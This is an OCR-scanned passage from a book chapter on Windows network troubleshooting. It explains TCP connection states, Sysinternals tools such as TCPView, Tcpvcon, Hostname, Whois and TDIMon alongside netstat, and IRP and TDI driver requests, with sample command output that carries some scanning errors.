the remote TCP, or an acknowledgment of the con- 
nection termination request previously sent. 
Waiting for a connection termination request from 
the remote TCR 
Waiting for a connection termination request from 
the local user. 
Waiting for a connection termination request 
acknowledgment from the remote TCR 
Waiting for an acknowledgment of the connection 
termination request previously sent to the remote 
TCP (which includes an acknowledgment of its con- 
nection termination request). 
Waiting for enough time to pass to be sure the 
remote TCP received the acknowledgment of its 
connection termination request. 
A fictional state, because it represents the state 
when there is no Transmission Control Block (TCB), 
and therefore, no connection state. 
The states in Table 8.1 are shown in Figure 8.2, which was derived from RFC 
793, TCP Connection State Diagram: Section 3.2, page 23, and the associated text in 
the RFC. Watching the state changes in TCPView with the TCP connection state 
diagram in Figure 8.2 is one means of monitoring a TCP connection. 

Network Troubleshooting 9 Chapter 8 
335 
Figure 8.2 TCP Connection State Diagram 
In practice, you can use TCPView to monitor a current situation in Windows 
while the command string netstat-abov 1 records almost identical information for 
later analysis. The b and v parameters record the sequence of processes and the DLL 
from the application to the actual process that makes the TCP/IP call. This is very 
useful if you are troubleshooting a network application or trying to determine 
whether malicious code is involved with a connection. 
Tcpvcon 
Tcpvcon is a command-line program that displays or records the same information 
displayed by TCPView. It provides information that is very similar to the informa- 
tion recorded by Netstat using the-abo parameters. 
Tcpvcon is easy to operate. To list its parameters, bring up the command-line 
environment, change directories to the directory containing the executable, and then 
enter the following line of code: 
C:\Program Files\System Internals\TCPView>tcpvcon /? 

336 
Chapter 8 9 Network Troubleshooting 
Tcpvcon will respond with the following: 
TCPView v2.34 - TCP/UDP endpoint lister 
Copyright 
(C) 1998-2003 Mark Russinovich 
Sysinternals - www.sysinternals.com 
Tcpvcon also displays the TCP and UDP endpoints: 
Usage: tcpvcon [-a] [-c] [-n] [process name or PID] 
Here's what the preceding code means: 
-a Show all endpoints (the default is to show established TCP connections). 
-e Print output as comma separated values (CSVs). 
-n Don't resolve addresses. 
process Show only the endpoints owned by the process specified. 
TCPVStat is the commercial version of Tcpvcon. Like Tcpvcon the user can list 
its parameters using "/?" 
TCPVStat will respond with: 
TcpView Stat vl.07 
Copyright 
(C) 2000-2003 Winternals Software LP 
http : //www. winternals, com 
usage: tcpvstat 
[-n] 
[-a] 
process 
address 
-n 
-a 
-p 
-d 
[-p] 
[-d] 
[<processname> or <address>] 
Show endpoints for matching processed or 
address (partial name or address accepted). 
Do not perform DNS name resolution. 
Show all endpoints. 
Sort by process. 
Show detailed information. 
Contrast these with Netstat: 
C:\Program Files\System Internals\TCPView>netstat 
/? 
Netstat responds with the following: 
Displays protocol statistics and current TCP/IP network connections. 
NETSTAT [-a] [-b] I-e] [-n] [-o] [-p proto] 
[-r] [-s] [-v] [interval] 
Here's what the preceding code means" 
-a Displays all connections and listening ports. 

Network Troubleshooting 9 Chapter 8 
337 
-b Displays the executable involved in creating each connection or listening 
port. In some cases, well-known executables host multiple, independent 
components, and in these cases, the sequence of components involved in 
creating the connection or the listening port is displayed. In this case, the 
executable name is in brackets (H) at the bottom, the component it called is 
on top, and so forth, until TCP/IP is reached. Note that this option can be 
time-consuming and will fail unless you have sufficient permissions. 
-e Displays Ethernet statistics. This may be combined with the -s option. 
-n Displays addresses and port numbers in numerical form. 
-o Displays the owning PID associated with each connection. 
--f proto Shows connections for the protocol specified by proto; proto may be 
TCP, UDP, TCPv6, or UDPv6. If used with the -s option to display per- 
protocol statistics, proto may be IP, IPv6, Internet Control Message Protocol 
(ICMP), ICMPv6, TCP, TCPv6, UDP, or UDPv6. 
-r Displays the routing table. 
-s Displays per-protocol statistics. By default, statistics are shown for IP, IPv6, 
ICMP, ICMPv6, TCP, TCPv6, UDP, and UDPv6; the -p option may be 
used to specify a subset of the default. 
-v When used in conjunction with -b, will display a sequence of components 
that are involved in creating the connection or the listening port for all 
executables. 
interval 1Ledisplays selected statistics, pausing an interval of seconds between 
each display. Press Ctrl+C to stop redisplaying statistics. If omitted, Netstat 
will print the current configuration information once. 
The Netstat parameters relevant to the comparison with Tcpvcon are a, b, n, 0, p, 
u, and interval. Normal output from Tcpvcon looks like this: 
C:\Program Files\System Internals\TCPView>tcpvcon 
-an 
TCPView v2.34 - TCP/UDP endpoint lister 
Copyright (C) 1998-2003 Mark Russinovich 
Sysinternals - www.sysinternals.com 
[TCP] C: \WINDOWS\system32\svchost. exe 
PID: 
1164 
State: 
LISTENING 
www.syngress.com 

338 
Chapter 8 9 Network Troubleshooting 
Local: 
0.0.0.0:135 
Remote: 
0.0.0.0:0 
[TCP] 
System 
PID: 
4 
State: 
LISTENING 
Local: 
0.0.0.0:445 
Remote: 
0.0.0.0:0 
[TCP] 
C:\WINDOWS\System32\alg.exe 
PID: 
1456 
State : 
LISTENING 
Local : 
127.0.0.1 
: 1025 
Remote : 
0.0.0.0 
: 0 
The -a parameter tells Tcpvcon to include all connections and listening ports. 
Excluding-a will tell Tcpvcon to include only connection endpoints and will 
exclude servers without established connections and all internal listening ports used 
for internal process communication. 
To gather almost the same information as Tcpvcon you can use Netstat with the 
parameter-ano. Netstat can collect this information over an interval with the fre- 
quency selected as a parameter. The only difference is that with these parameters, 
Netstat doesn't translate the PID into an application name: 
C:\Program 
Files\System 
Internals\Whois>netstat 
-ano 
Active 
Connections 
Proto 
Local Address 
Foreign Address 
State 
PID 
TCP 
0.0.0.0 
: 135 
0.0.0.0 
: 0 
LISTENING 
1164 
TCP 
0.0.0.0 
: 445 
0.0.0.0 
: 0 
LISTENING 
4 
TCP 
127.0.0.1 
: 1025 
0.0.0.0 
: 0 
LISTENING 
1456 
TCP 
192. 168.1. 171 : 139 
0.0.0.0 
: 0 
LISTENING 
4 
TCP 
192.168.1.171:3954 
192.168.1.170:445 
TIME 
WAIT 
0 
m 
UDP 
0.0.0.0:445 
*:* 
4 
UDP 
0.0.0.0 
: 500 
* : * 
924 
UDP 
0.0.0.0 
: 1026 
* : * 
1244 
UDP 
0.0.0.0 
: 1560 
* : * 
1244 
UDP 
0.0.0.0 
: 4500 
* : * 
924 
UDP 
0.0.0.0 
: 4608 
* : * 
1244 
UDP 
127.0.0.1 
: 123 
* : * 
1200 
UDP 
127.0.0.1 
: 1027 
* : * 
924 

Network Troubleshooting 9 Chapter 8 
339 
UDP 
127.0.0.1:1073 
*:* 
868 
UDP 
127.0.0.1:1900 
*:* 
1352 
UDP 
192.168.1.171:123 
*:* 
1200 
UDP 
192.168.1.171:137 
*:* 
4 
UDP 
192.168.1.171:138 
*:* 
4 
UDP 
192.168.1.171:1900 
*:* 
1352 
Compare this to the output of Tcpvcon using its option to output CSV-for- 
matted information. This makes it easier for the user to dump the results into a 
spreadsheet for analysis. Here is the same kind of information as that shown earlier, 
formatted in CSV format.You will notice that Tcpvcon includes the name and path 
of the application that caused the connection to be open" 
C : \Program Files\System Internals\TCPView>tcpvcon -anc 
TCP,C:\WINDOWS\system32\svchost.exe,l164,LISTENING, 0.0.0.0:135,0.0.0.0:0 
TCP,System, 4,LISTENING, 0.0.0.0:445,0.0.0.0:0 
TCP,C:\WINDOWS\SystemB2\alg.exe,1456,LISTENING, 127.0.0.1:1025,0.0.0.0:0 
TCP,System, 4,LISTENING, 192.168.1.171:I39,0.0.0.0:0 
UDP,System, 4,,0.0.0.0:445,*:* 
UDP,C:\WINDOWS\system32\isass.exe,924,,0.0.0.0:500,*:* 
UDP,C:\WINDOWS\System32\svchost.exe,1244,,0.0.0.0:1026,*:* 
UDP,C:\WINDOWS\System32\svchost.exe,1244,,0.0.0.0:1560,*:* 
UDP,C:\WINDOWS\system32\isass.exe,924,,0.0.0.0:4500,*:* 
UDP,C:\WINDOWS\System32\svchost.exe,1244,,0.0.0.0:4608,*:* 
UDP,C:\WINDOWS\System32\svchost.exe,1200,,127.0.0.1:123,*:* 
UDP,C:\WINDOWS\system32\isass.exe,924,,127.0.0.1:1027,*:* 
UDP,\??\C:\WINDOWS\system32\winlogon.exe,868,,127.0.0.1:1073,*:* 
UDP,C:\WINDOWS\System32\svchost.exe,1352,,127.0.0.1:1900,*:* 
UDP,C:\WINDOWS\System32\svchost.exe,1200,,192.168.1.171:123,*:* 
UDP,System, 4,,192.168.1.171:137,*:* 
UDP,System, 4,,192.168.1.171:138,*:* 
UDP,C:\WINDOWS\System32\svchost.exe,1352,,192.168.1.171:1900,*:* 
There is no clean way to add.just the process name to the Netstat output. To add 
the process name you must also add all steps under the application which contribute 
to establishing the TCP/IP connection. To add the process name, you can select the 
b and/or the v option. Here is one entry with the b option set: 
C:\Program Files\System Internals\Whois>netstat -abno 
Active Connections 

340 
Chapter 8 9 Network Troubleshooting 
Proto 
Local Address 
Foreign Address 
TCP 
0.0.0.0:135 
0.0.0.0:0 
c:\windows\system32\WS2_32.dll 
C:\WINDOWS\system32\RPCRT4.dll 
c:kwindowsksystem32\rpcss.dll 
C:\WINDOWS\system32\svchost.exe 
C:\WINDOWSksystem32\ADVAPI32.dll 
[svchost.exe] 
State 
PID 
LISTENING 
1164 
This information is useful for troubleshooting, but the format makes it difficult 
to put in a spreadsheet for processing. The list of processes involved in making the 
network connection can assist an analyst in determining whether malicious code is 
present. If the analyst knows the normal processes involved when an application 
makes a network connection, he can examine any new process in the sequence with 
suspicion. For this reason, it is always a good idea to know what normal looks like 
before you need to check for deviations from normal. For the less technical among 
you, this information can be provided to the application developer's tech support or 
submitted to technical discussion forums that help users determine if they've been 
"owned." 
The main advantage to using Netstat is that you can add an interval parameter 
so that the networking information is recorded every interval seconds.You can emu- 
late this by creating a batch file or writing some Perl code to surround the Tcpvcon 
executable. 

Network Troubleshooting 9 Chapter 8 
341 
TCPVStat 
can use its "-d" parameter 
to add more detail to the TCPVcon 
output. 
The extra detail displays a count of the number of bytes that have 
been sent or received. 
Strangely, 
TCPVStat does not have a parameter to 
display its results in CSV format. 
C:\Program Files\Winternals\tcpview 
pro>tcpvstat 
-n -a -d 
TcpView Stat vl.07 
Copyright 
(C) 2000-2003 Winternals Software LP 
http : //www. winternals, com 
Process 
Proto Local Address 
svchost.exe:l168 
TCP 
0.0.0.0:135 
System:4 
TCP 
0.0.0.0:445 
alg.exe:1680 
TCP 
127.0.0.1:1025 
System:4 
TCP 
192.168.1.171:139 
System:4 
UDP 
0.0.0.0:445 
isass.exe:928 
UDP 
0.0.0.0:500 
svchost.exe:1384 
UDP 
0.0.0.0:1026 
Messages sent 
: 170 
Remote Address 
LISTENING 
LISTENING 
LISTENING 
LISTENING 

342 
Chapter 8 9 Network Troubleshooting 
Bytes sent 
: 9638 
Messages received: 134 
Bytes received : 15931 
ethereal.exe:2656 
UDP 
Messages sent 
: 3 
Bytes sent 
: 122 
Messages received: 3 
Bytes received : 246 
svchost.exe:1384 
UDP 
Messages sent 
: 39 
Bytes sent 
: 1484 
Messages received: 39 
Bytes received : 3760 
isass.exe:928 
UDP 
svchost.exe:1252 
UDP 
isass.exe:928 
UDP 
winlogon.exe:872 
UDP 
OUTLOOK.EXE:3216 
UDP 
Messages sent 
: 1 
Bytes sent 
: 1 
Messages received: 1 
Bytes received : 1 
iexplore.exe:3612 
UDP 
Messages sent 
: 95 
Bytes sent 
: 95 
Messages received: 95 
Bytes received : 95 
svchost.exe:1416 
UDP 
Messages received: 3 
Bytes received : 399 
svchost.exe:1252 
UDP 
Messages sent 
: 27 
Bytes sent 
: 1836 
Messages received: 26 
Bytes received : 1768 
0.0.0.0:1115 
0.0.0.0:2110 
0.0.0.0:4500 
127.0.0.1:123 
127.0.0.1:1027 
127.0.0.1:1066 
127.0.0.1:1208 
127.0.0.1:1360 
127.0.0.1:1900 
192.168.1.171:123 

Network Troubleshooting 9 Chapter 8 
343 
System:4 
UDP 
Messages sent 
: 1557 
Bytes 
sent 
: 104652 
System:4 
UDP 
Messages sent 
: 216 
Bytes 
sent 
: 48576 
Messages received: 60 
Bytes 
received 
: 18180 
Bytes 
accepted 
: 4920 
svchost, exe : 1416 
UDP 
192.168.1.171:137 
*:* 
192.168.1.171:138 
*:* 
192.168.1.171:1900 
*:* 
TCPView Pro 
The commercial version of TCPView Pro combines the functionality of TCPView 
and TDIMon. It also adds the ability to filter the displayed information, highlight 
entries, and sort on columns. In addition, the drivers for TCPView Pro are loaded 
during the boot process, before network connectivity is active. This means connec- 
tions that are made during the boot process will be visible to TCPView Pro where 
they were invisible to TCPView (see Figure 8.3). 
Figure 8.3 TCPView Pro Display 

344 
Chapter 8 9 Network Troubleshooting 
New fields include Sent and Received in the upper static view. The lower view 
is essentially the TDIMon view. The Action column entries have been shortened so 
that they reflect the action of the associated TDI commands rather than the actual 
commands themselves. In addition, a column has been added for the number of 
bytes associated with each action. 
Performing DNS and 
Reverse DNS Lookups (Hostname) 
TCP/IP network traffic operates using IP addresses only since numeric addresses are 
efficient for computer use. Humans, however, have difficulty with numeric addresses 
and prefer alphabetic names. In order to accommodate both needs, the Internet 
architects provided Domain Name System (DNS) servers to translate between the 
two worlds. Networked applications, such as browsers, that provide a user interface 
can permit users to identify systems using names by querying the DNS servers for 
IP addresses which can then be used to construct TCP/IP messages. Similarly these 
applications can translate machine friendly IP addresses into human friendly host 
names using reverse DNS lookups. The Hostname application provides a means for 
users send a name to the DNS server that performs a name service lookup and 
responds with an IP address. Hostname also provides users a means to send an IP 
Address to a DNS, then the DNS server performs a Reverse DNS lookup and pro- 
vides the host name. 
Domain Name Addressing 
Domain names are intended to be human readable but they must still be traversable. 
Thus host names are not free form and must have a consistent hierarchical construc- 
tion. 
While humans read host names from left to right, computers process the hier- 
archy of domain name addressing from right to left. The furthest right name in the 
fully qualified domain name is the name of the Top Level domain name. The Top 
Level domain name becomes important when the local resolver (e.g. the hosts.txt 
file) on the host computer is doesn't have a listing for the name and the primary and 
secondary domain name servers listed for the host also do not have a record of the 
host name in question (see Figure 8.4). 
www.syngress.com 

Network Troubleshooting 9 Chapter 8 
345 
Figure 8.4 Domain Name Query Processing 
The Recursive Server to Server queries begin at the Name server responsible for 
the Top Level Domain. There are two Top Level Domains for each country and one 
domain (.ARPA) for Internet Infrastructure data bases. Information on the TLD 
country domains can be found at www.iana.org/cctld/cctld-whois.htm. In addition 
there are TLD for .AERO, .BIZ, .COM, .COOR .EDU, .GOV, .INFO, .INT, .MIL, 
.MUSEUM, .NAME, .NET, .ORG, and .PRO. Each of these TLD maintains a 
database of all domains in their TLD. Recursive server to server queries begin at the 
TDL database and work their way to a name server with authoritative data on the 
host in question. For example, the next level domain in the .COM TLD is usually a 
company name like "Syngress.com" 
How Hostname Works 
Hostname is a simple and straightforward utility. It uses the primary name server 
(named in IPConfig) and sends a UDP 53 Domain Name System (DNS) query 
with the name or IP address in question. If the user sends an IP address, Hostname 
will retrieve cname data associated with that IP address. If the user enters an unquali- 
fied name, Hostname sends the request to the primary name server. If the unquali- 
fied name isn't found on the primary DNS server, Hostname returns an error 
(Invalid IP Address). If it is a fully qualified name that belongs to another domain, the 
primary domain server will follow the DNS protocol architecture to forward the 
query to an authoritative source. If the name isn't found using DNS, Hostname sub- 
mits a Name query using Netbios Name Service. 
Here is one example: 
C: \Program Files\System Internals\Hostname>hostname 
syngress, com 
155.212.56.73 
Here is another example: 
C: \Program Files\System Internals\Hostname>hostname 
155.212.56.73 
host73. 155. 212.56. conversent, net 

346 
Chapter 8 9 Network Troubleshooting 
Getting Public 
Domain Information (Whois) 
Whois is a utility program from Sysinternals that uses the whois Internet service to 
display contact information, name servers, and owner information which ties the vir- 
tual Web back to the physical world. This is an essential link if you are investigating 
crime or if you want to alert a company about phishing attacks or abuse coming 
from their systems. 
Internet Domain Registration 
The whois Internet service has undergone major morphing since its inception. 
Essentially it was created while the Internet was government regulated. Whois was 
intended to provide the link from virtual domains to actual companies and points of 
contact for administrative and technical issues. The service still provides this informa- 
tion, but the reliability of the information is weakened by the current federated 
approach rather than the trusted central authority from which it sprang. Similar to 
DNS, the domain information is only as good as the registrar requires it to be. 
Running Whois and Interpreting the Results 
Whois is a command-line application, designed to retrieve domain information from 
whois servers with a minimum of information: 
Whois vl.01 - Domain information lookup utility 
Sysinternals 
- www. sysinternals, com 
Copyright 
(C) 2005 Mark Russinovich 
Useage : whois domainname 
[whois. server] 
The user provides the domain name and an optional whois server. If no whois 
server is provided, the Whois application performs a DNS query for a prestaged 
entry of the following form, in the master domain name server for the top-level 
domain: 
top level domain.whois-servers.net 
The CName value for this entry points to the official whois server for the top- 
level domain. The Whois application uses the CName value and sends the domain 
name entered by the user as a parameter of a whois protocol query on port 43 
(sometimes labeled as the nickname service). For example, whois.verisign-grs.com is 

Network Troubleshooting 9 Chapter 8 
347 
the CName value for both COM.whois-servers.net and NET.whois-servers.net. The 
CName value for EDU.whois-servers.net is set to whois.educause.net. 
Here are the results when looking up syngress.com using the Whois utility: 
C: \Program Files\System Internals\Whois>whois syngress, com 
Whois vl.01 - Domain information lookup utility 
Sysinternals - www.sysinternals.com 
Copyright (C) 2005 Mark Russinovich 
Connecting to COM.whois-servers.net... 
Connecting to whois.networksolutions.com... 
SYNGRESS Media, Inc. 
145 Washington Street 
Norwell, MA 02061 
US 
Domain Name: SYNGRESS.COM 
Administrative Contact: 
SYNGRESS Media, Inc. 
145 Washington Street 
Norwell, MA 02061 
US 
(617) 681-5151 fax: 999 999 9999 
mike@syngress, com 
Technical Contact: 
Network Solutions, LLC. 
13200 Woodland Park Drive 
Herndon, VA 20171-3025 
US 
1-888-642-9675 fax: 571-434-4620 
customerservice@networksolutions.com 
Record expires on 09-Sep-2013. 
Record created on I0-Sep-1997. 
Database last updated on 4-May-2006 23:56:10 EDT. 
Domain servers in listed order: 
www.syngress.com 

348 
Chapter 8 9 Network Troubleshooting 
NSI.CONVERSENT.NET 
NS2.CONVERSENT.NET 
216.41.101.15 
216.41.101.17 
You can also send IP addresses through Whois to find out more about the 
owner. So, say you get the IP address associated with Syngress.com from Hostname: 
C: \Program Files\System Internals\Hostname>hostname syngress, com 
155.212.56.73 
Now take the IP address and send it through Whois: 
C:\Program Files\System Internals\Whois>whois 155.212.56.73 
Whois vl.01 - Domain information lookup utility 
Sysinternals - www.sysinternals.com 
Copyright (C) 2005 Mark Russinovich 
Connecting to NET.whois-servers.net... 
Connecting to whois, godaddy, com... 
The data contained in Go Daddy Software, Inc.'s WhoIs database, 
while believed by the company to be reliable, is provided "as is" 
with no guarantee or warranties regarding its accuracy. 
This 
information is provided for the sole purpose of assisting you 
in obtaining information about domain name registration records. 
Any use of this data for any other purpose is expressly forbidden without 
the prior written permission of Go Daddy Software, Inc. 
By submitting an 
inquiry, you agree to these terms of usage and limitations of warranty. 
In 
particular, you agree not to use this data to allow, enable, or otherwise 
make possible, dissemination or collection of this data, in part or in its 
entirety, for any purpose, such as the transmission of unsolicited 
advertising and and solicitations of any kind, including spam. 
You further 
agree not to use this data to enable high volume, automated or robotic 
electronic processes designed to collect or compile this data for any 
purpose, including mining this data for your own personal or commercial 
purposes. 
Please note: the registrant of the domain name is specified 
in the "registrant" field. 
In most cases, Go Daddy Software, Inc. 
is not the registrant of domain names listed in this database. 

Network Troubleshooting 9 Chapter 8 
349 
Registrant: 
Conversent Data Vault LLC 
313 Boston Post Road 
Marlboro, Massachusetts 01752 
United States 
Registered through: GoDaddy. com 
Domain Name : CONVERSENT.NET 
Created on: 24-Sep-99 
Expires on: 24-Sep-06 
Last Updated on: 20-Sep-05 
Administrative Contact: 
Jackson, Brian 
b.k.jackson@mac.com 
Conversent Data Vault LLC 
313 Boston Post Road 
Marlboro, Massachusetts 01752 
United States 
6036066351 
Fax -- 6036695917 
Technical Contact: 
Data Services, Director 
domreg@conversent.net 
Conversent Data Vault LLC 
313 Boston Post Road West 
Suite 140 
Marlborough, Massachusetts 01752 
United States 
5084866300 
Fax -- 6036695917 
Domain servers in listed order: 
NS2. CONVERSENT. NET 
NS 1. CONVERSENT. NET 
Submitting the IP address yields information about the owner of the IP block, 
although the information the Whois utility returns was not exactly what I expected. 
This information was retrieved from the registrar for the domain Conversent.net. I 
had actually expected to see IP block information like the following, from ARIN.net 
(retrieved using the IP Block tool in the Sam Spade utility, from SamSpade.org)" 
05/04/06 21:26:21 IP block 155.212.56.73 

350 
Chapter 8 9 Network Troubleshooting 
Trying 155.212.56.73 at ARIN 
Trying 155.212.56 at ARIN 
OrgName: 
Conversent Communications 
OrgID: 
CONVER-100 
Address: 
313 Boston Post Road West 
City: 
Marlborough 
StateProv: 
MA 
PostalCode: 01752 
Country: 
US 
NetRange: 
CIDR: 
NetName: 
NetHandle: 
Parent: 
NetType: 
155.212.0.0 - 155.212.255.255 
155.212.0.0/16 
CONVERSENT-155 
NET-155-212-0-0-1 
NET-155-0-0-0-0 
Direct Allocation 
NameServer: NS.IDS.NET 
NameServer: NS2.IDS.NET 
Comment: 
RegDate: 
1991-12-02 
Updated: 
2004-10-14 
OrgTechHandle: RC630-ARIN 
OrgTechName: 
Conversent Role Account 
OrgTechPhone: 
+1-888-885-4437 
OrgTechEmail: 
abuse@conversent.com 
# ARIN WHOIS database, last updated 2006-05-04 19:10 
As you can see, each Whois database query provides a wealth of information. 
Add to this the information from IP Block and you have many leads when trying to 
track a domain owner, whom to contact about abuse, or when trying to track down 
spammers. For more information on using Whois, read the excellent tutorial by Matt 
Schneider, "How to use whois to track spammers," located at 
www. netdemon, net / tutorials/whois, txt. 

Network Troubleshooting 9 Chapter 8 
351 
Identifying Problematic Network 
Applications (TDIMon, TCPView Pro) 
Network problems can range from the simple and obvious to the most complex 
problems found in industry. A user may observe a problem while using a networked 
application. The effect the user sees may be caused in a number of places. Consider a 
single-user application. When a user sees a problem while using such an application, 
the cause of the problem could exist in any of the layers or between any two of the 
layers shown in Figure 8.5. The layers in this diagram are represented by the applica- 
tion layer on the open systems interconnection (OSI) network model. 
Figure 8.5 Layers for a Single Host Application 
Look at the OSI model in Figure 8.6 and note the opportunity for a problem in 
each layer. In the figure, the two complete protocol stacks represent host computers 
that have a connection. Problems seen by a user may occur in or between any of 
these layers, from the application layer of one host to the application layer of the 
other host. Further, every device between the two hosts (represented by the routers, 
switches, bridges, hubs, and repeaters) through which the network connection traffic 
passes has the opportunity to introduce a "network" error. The OSI model is a theo- 
retical model that is useful in describing networking functionality, but it did not 
achieve widespread acceptance for implementation. The Sysinternals and Winternals 
tools are implemented on Windows systems. Windows uses an architecture more like 
that shown in Figure 8.6. 

352 
Chapter 8 9 Network Troubleshooting 
Figure 8.6 Network OSI Layers As Opportunities for Error 
The Sysinternals and Winternals tools assist users and developers in determining 
where problems have occurred. Each tool can provide insights into a different part of 
the problem. 
Figure 8.7 shows a continuum of communications between two networked hosts 
and which applications are useful during which part of the communication. 
TCPView, Tcpvcon, and Netstat can diagnose issues with the establishment (TCP 
handshake) and closing of TCP connections. For UDP, which is connectionless, these 
tools can reveal only the presence of the UDP endpoints and the process to which 
they are related. Since these tools map network endpoints to applications, they can 
be useful in identifying and dealing with malicious code. TCPView also provides the 
user with a quick means of terminating any connection. 
TDIMon provides insights into the communication between applications and 
network device drivers, and thus is useful in diagnosing problems with an application 
or device driver's use of an application program interface (API), a service program 
interface (SPI), or the device driver itself. Ethereal, an application covered in-depth 
in two Syngress publications, Ethereal Packet Sniffing and Nessus, Snort, & Ethereal 
Power Tools, reveals application data embedded inside network traffic and network 
protocol details, as illustrated in Figure 8.7. Additional tools, used to troubleshoot 
layer 2 and 3 devices, include ping, traceroute, and arp. These have been historically 
provided on all platforms to support network troubleshooting. 

Network Troubleshooting 9 Chapter 8 
353 
Figure 8.7 Network Tools Map 
Figure 8.7 does not include the Hostname and Whois utilities. These two utili- 
ties and associated data exist to support human interactions with networked systems. 
Hostname permits users to describe network destinations using human-readable 
names rather than octets of IP addresses, or determine human-readable names given 
an IP address. It is useful when translating network traffic that was collected by IP 
addresses when you want to know the host name or vice versa. From a trou- 
bleshooting perspective, Hostname is a quick and easy way to find an IP address for 
a host name or vice versa, or to generate DNS-related traffic. But for anything 
beyond that, an analyst would need nslookup or dig. 
Whois permits you to find information about the owner of a domain or IP 
address. This information is useful when investigating spam and phishing attacks, ana- 
lyzing suspicious emails, or performing network forensics. It can also reveal name 
servers that you can try for resolution of suspicious IP addresses that don't resolve 
through normal DNS recursive queries. 
Using the Tools to Find and Correct Issues 
Of the tools presented in this chapter, the one likely to be foreign to most network 
and security professionals, unless they've worked on driver development projects, is 
TDIMon (Transport Driver Interface Monitor). The goal of this chapter toward 
TDIMon is to provide enough information for users to be able to interpret the 
information in the logs. It is beyond the scope of the chapter to cover analysis and 
troubleshooting of device driver development. For information at that level readers 
should acquire the Windows 2003 Driver Develop Kit (DDK). Unfortunately at the 
time of this writing this information is only available in a ISO image formatted file 
for the Kernel-Mode Development Framework (KDMF) that is meant to be burnt 
to a CD. It can be downloaded from the Microsoft web site at 
www.microsoft.com/whdc/driver/wdf/KMDF_pkg.mspx. After creating the CD, 
the user can install the KMDE In the directory where KMDF was installed, locate 

354 
Chapter 8 9 Network Troubleshooting 
and open the Help folder. In the Help folder, locate and open the help file net- 
work.chm. This brings up a Web page tiffed "Network Devices and Protocols." On 
the right hand side of the page there is a link to a Design Guide and one to 
Reference. Open the link to the Reference to find a set of useful topics, including 
TDI Drivers. This link will provide a good next step for digging into the world of 
network drivers and TDI. Figure 8.8 shows TDIMon's column headings. 
Figure 8.8 TDIMon Column Headings 
TDIMon captures and displays transport data interface information in near-real 
time, which makes it a valuable companion to Ethereal. TDIMon labels each record 
it receives with a sequence number.You can display the Time field in either clock 
time or sequence time by clicking on the clock or entering Ctrl+t. Unfortunately, 
the two times are not displayed with the same resolution. Clock time only displays 
time to the seconds in resolution. Sequence time since the beginning of capture, on 
the other hand, resolves to one 100-millionth of a second. Usually, to match these 
records with records from other tools, you want clock time with a resolution of less 
than one second, since 30 or more events can happen in any one second. In fact, if 
your system generates TCP/IP activity faster than TDIMon can capture and record 
it, the TDIMon display will be missing sequence numbers. Using the time format 
toggle only converts new entries that are captured. Theoretically, you can capture the 
first several entries using clock time and then change the format to sequence time 
for the majority of the log, finally converting back to clock time at the end to pro- 
vide a beginning and ending clock time. With this information, you can dump the 
log to a spreadsheet and convert the sequence time into clock time fairly easily. 
As in TCPView, TDIMon records both the process name and the PID.The file 
object address and the process name or ID can be used to retrieve the handle 
number from Process Explorer. 

Network Troubleshooting 9 Chapter 8 
355 
The Request column displays the I/O request packet (IRP) request or the TDI 
command.You can find an explanation of IRP requests in the next section, "IRP 
Life Cycle."TDI commands are listed in Table 8.2. 
Like TCPView, TDIMon displays the local IP address and port as well as the 
remote IP address and port.An IP address of 0.0.0.0 or 127.0.0.1 refers to the local 
host. 
The Result column displays the results from the IP, P request or TDI command. 
The entries that have a hyphen followed by a number tell us that the result for a 
request or command was not completed by the time another request or command 
was posted. The hyphenated number after the result tells us the sequence number in 
which the result was achieved. The log record for a sequence number in the hyphen- 
ated portion is usually not repeated in the log, since it is just the results portion of an 
earlier result. 
The Other column contains more specifics for IRP requests or TDI commands, 
or for clarifying data. For example, a UDP TDI command of TDI_Send_Datagram 
will have the length of the datagram in the Other column, but for the 
TDl_Set_Event_Handler command the Other column will identify the event type. 
IRP Life Cycle 
Every connection using TDI begins and ends with an I/O request packet. The life of 
a network device file object is defined by three types of IRP requests: 
IRP_MJ_CREA TE, IRP_MI_CLEANUP, and IRP_MI_CL OSE. 
IRP_M.J_CREATE 
Every time a network device is opened, the I/O manager creates a file object and a 
handle to refer to it. Every use of the device requires a different file object. The file 
object contains state information and represents an address and a connection end- 
point or control channel. Only the host end of the connection exists at this point 
and several TDI commands are used to finish setting up this side of the connection. 
If this is a network connection where the host will transmit data to another host, 
once the host side is ready, the application sets up the other side of the connection 
beginning with another 1RP_MJ_CREATE, this time to set up a connection object. 
More TDI commands will associate the host IP address and a port with the connec- 
tion object, and then associate the connection object with the foreign IP address and 
port.An IRP_MJ_DEVICE_CONTROL associates the connection object address 
with the data to be sent. Finally, another TDI command begins sending the data to 
the network device and ultimately to the foreign IP address. 
www.syngress.com 

356 
Chapter 8 9 Network Troubleshooting 
IRP_MJ_CLEANUP 
When the I/O manager determines that the last handle to a network device file 
object has been closed, it sends an IRP_M.J_CLEANUP request to the device driver. 
This tells the device driver to complete all pending I1KPs for the network device file 
object (having the same context). After all the pending IIKPs are completed, the I/O 
manager destroys the file object. 
IRP_MJ_CLEANUP 
Once the file object is destroyed, the I/O manager sends the device driver the 
IRPMJ_CLOSE request. This lets the network device driver know that it should 
reverse the steps it took in response to the earlier CREATE request, with some 
additional hardware-specific actions. 
You can find a good resource for further information about IRP request pro- 
cessing on the Microsoft Web site in the document titled "Handling IRPs: What 
Every Driver Writer Needs to Know," which at the time of this writing was at 
www. microsoft, com/whds/driver/kernel/I1KPS.mspx. 
TDI Commands 
TDI commands are listed in Table 8.2. 
Table 8.2 TDI Commands 
Command 
Definition 
TDl_Accept 
TDI Action 
TDI Associate Address 
www.syngress.com 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to accept the offer of an 
incoming connection from a remote IP 
address, enabling network data transfers 
between them. 
A request made by a kernel-mode client to 
the network device driver (through the TDI 
transport driver) to have transport-specific 
extensions made available to the client. 
A request made by a kernel-mode client to 
ask the device driver (through the TDI trans- 
port driver) to make an association between 
a particular network device file object and an 
open connection endpoint. 
Continued 

Network Troubleshooting 9 Chapter 8 
357 
Table 8.2 continued TDI Commands 
Command 
Definition 
TDI Connect 
TDi Disassociate Address 
TDI DISCONNECT 
TDI LISTEN 
TDI_QU ERY_IN FORMATION 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to offer a connection on 
a local-node connection endpoint to a for- 
eign IP address. 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to break the association 
between the local node and an endpoint of 
an inactive connection. 
A request made by a kernel-mode client to 
ask the network device driver (through the 
TDI transport driver) to indicate to the 
remote node that they should disconnect, to 
acknowledge a disconnect notice from an 
